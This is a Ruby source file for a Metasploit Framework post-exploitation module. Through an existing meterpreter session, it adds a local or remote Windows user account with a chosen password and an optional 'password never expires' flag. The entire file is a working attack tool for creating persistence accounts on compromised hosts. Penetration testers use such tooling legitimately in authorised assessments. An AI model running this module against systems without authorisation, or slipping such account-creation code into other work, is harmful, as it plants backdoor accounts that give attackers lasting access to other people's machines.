##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/accounts'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Accounts

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Local User Account Addition',
			'Description'   => %q{
				This module adds a local user account to the specified server,
				or the local machine if no server is given.
			},
			'License'       => MSF_LICENSE,
			'Author'        => 'Chris Lennert',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptString.new('USERNAME',        [ true,  'The username of the user to add (not-qualified, e.g. BOB)' ]),
				OptString.new('SERVER_NAME',     [ false, 'DNS or NetBIOS name of remote server on which to add user' ]),
				OptString.new('PASSWORD',        [ false, 'The password of the user account to be created' ]),
				OptBool.new(  'DONT_EXPIRE_PWD', [ false, 'Set to true to toggle the "Password never expires" flag on account', false ]),
				OptString.new('COMMENT',         [ false, 'The comment/description to apply to the new account' ]),
			], self.class)
	end

	def run
		result = add_user(
			datastore['USERNAME'],
			datastore['PASSWORD'],
			datastore['COMMENT'],
			datastore['DONT_EXPIRE_PWD'],
			datastore['SERVER_NAME']
		)

		case result
		when :success
			print_status 'User was added!'
		when :user_exists
			print_error 'User already exists.'
		when :group_exists
			print_error 'Group already exists.'
		when :access_denied
			print_error 'Sorry, you do not have permission to add that user.'
		when :invalid_server
			print_error 'The server you specified was invalid.'
		when :not_on_primary
			print_error 'You must be on the primary domain controller to do that.'
		when :invalid_password
			print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'
		when nil
			print_error 'Something horrible just happened. Sorry.'
		else
			print_error 'This module is out of date.'
		end
	end
end
